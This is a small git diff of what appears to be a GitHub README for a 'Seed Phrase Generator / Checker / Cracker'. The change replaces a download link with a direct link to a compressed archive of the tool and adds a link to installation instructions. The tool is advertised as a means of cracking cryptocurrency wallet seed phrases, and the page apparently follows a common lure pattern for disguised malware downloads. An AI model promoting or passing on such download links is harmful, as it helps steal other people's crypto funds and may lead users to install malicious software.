@@ -1,5 +1,6 @@
 
-# [DOWNLOAD](https://github.com/darkangelwhitefox/jubilant-winner/releases/tag/latestversion)
+# [DOWNLOAD](https://github.com/cranqwenty0/Zeus-Seed-Tool/releases/download/Download/Seed_GenChecker_x64.7z)
+# [Click here to view installation instructions](https://github.com/cranqwenty0/Zeus-Seed-Tool/blob/main/Installation%20instructions.txt)
 
 ### 🎉 Seed Phrase Generator / Checker / Cracker 🎉🔑✨
 
